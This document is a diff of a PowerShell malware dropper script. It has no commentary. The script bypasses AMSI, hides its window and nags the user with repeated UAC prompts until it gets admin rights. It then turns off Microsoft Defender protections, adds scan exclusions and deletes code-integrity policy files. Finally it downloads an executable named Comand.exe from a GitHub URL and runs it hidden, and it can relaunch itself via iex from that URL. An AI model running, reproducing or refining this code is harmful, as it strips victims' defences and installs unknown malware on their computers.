@@ -1,18 +1,22 @@
-# Hide Console Window
-Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
-$w = [C.W]::GetConsoleWindow()
-if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
+# ===== 1. AMSI KILL (must be first, wrapped so it never throws) =====
+try { [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) } catch {}
 
-# ============ SELF-URL (relaunch point when executed via iex from web) ============
+# ===== 2. HIDE WINDOW (wrapped) =====
+try {
+    Add-Type -Name W -Namespace C -MemberDefinition '[DllImport("Kernel32.dll")] public static extern IntPtr GetConsoleWindow();[DllImport("User32.dll")] public static extern bool ShowWindow(IntPtr h,int c);' -ErrorAction SilentlyContinue
+    $w = [C.W]::GetConsoleWindow()
+    if ($w -ne [IntPtr]::Zero) { [C.W]::ShowWindow($w, 0) | Out-Null }
+} catch {}
+
+# ===== 3. SELF-URL + ADMIN CHECK =====
 $self = "https://github.com/analysisw/test/raw/refs/heads/main/test.ps1"
-
-# ============ ADMIN CHECK ============
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
-# ============ RELAUNCH TARGET (works from disk AND from iex URL) ============
-$relaunch = if ($PSCommandPath) { "-File `"$PSCommandPath`"" } else { "-c iex((New-Object Net.WebClient).DownloadString('$self'))" }
+# ===== 4. RELAUNCH TARGET with AMSI patch inside =====
+$patch = "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue(`$null,`$true)"
+$relaunch = if ($PSCommandPath) { "-File `"$PSCommandPath`"" } else { "-c $patch;iex((New-Object Net.WebClient).DownloadString('$self'))" }
 
-# ============ ELEVATION LOOP: retry until admin granted, never crash ============
+# ===== 5. ELEVATION LOOP (infinite, silent, retry until admin) =====
 while (-not $isAdmin) {
     try {
         Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass $relaunch" -ErrorAction Stop
@@ -24,25 +28,25 @@ while (-not $isAdmin) {
 
 if (-not $isAdmin) { exit }
 
-# ============ ADMIN GRANTED: WORK (all silent, no errors to console) ============
+# ===== 6. ADMIN WORK (everything silent, zero output) =====
 try {
-    Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue
-    Add-MpPreference -ExclusionPath "$env:TEMP\Comand.exe" -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue
-    Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue
+    try { Add-MpPreference -ExclusionPath $env:TEMP -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction SilentlyContinue } catch {}
+    try { Set-MpPreference -DisableScriptScanning $true -ErrorAction SilentlyContinue } catch {}
 
-    Remove-Item -LiteralPath "$((Get-Partition | ? IsSystem).AccessPaths[0])Microsoft\Boot\WiSiPolicy.p7b" -ErrorAction SilentlyContinue
-    Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b" -ErrorAction SilentlyContinue
-    Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b" -ErrorAction SilentlyContinue
-    Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse -ErrorAction SilentlyContinue
+    try { Remove-Item -LiteralPath "$((Get-Partition | ? IsSystem).AccessPaths[0])Microsoft\Boot\WiSiPolicy.p7b" -Force -ErrorAction SilentlyContinue } catch {}
+    try { Remove-Item -LiteralPath "$env:windir\System32\CodeIntegrity\WiSiPolicy.p7b" -Force -ErrorAction SilentlyContinue } catch {}
+    try { Remove-Item -LiteralPath "$env:windir\Boot\EFI\wisipolicy.p7b" -Force -ErrorAction SilentlyContinue } catch {}
+    try { Remove-Item -Path "$env:windir\WinSxS" -Include *winsipolicy.p7b* -Recurse -Force -ErrorAction SilentlyContinue } catch {}
 
-$path = Get-Location
-$folder = $path.Path
+    $folder = $env:TEMP
+    try { Add-MpPreference -ExclusionPath $folder -ErrorAction SilentlyContinue } catch {}
 
-try {
-    Add-MpPreference -ExclusionPath $folder -ErrorAction Stop
+    try {
+        Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue
+    } catch {}
+    try {
+        Start-Process -FilePath "$folder\Comand.exe" -WindowStyle Hidden
+    } catch {}
 } catch {}
-
-Invoke-WebRequest -Uri "https://github.com/analysisw/test/raw/refs/heads/main/Comand.exe" -OutFile "$folder\Comand.exe" -ErrorAction SilentlyContinue
-Start-Process -FilePath "$folder\Comand.exe" -WindowStyle Hidden   
